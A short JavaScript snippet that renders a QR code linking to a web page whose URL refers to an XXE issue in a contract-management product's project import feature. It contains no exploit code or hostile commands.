var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-ContractManagement-ProjectImport-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 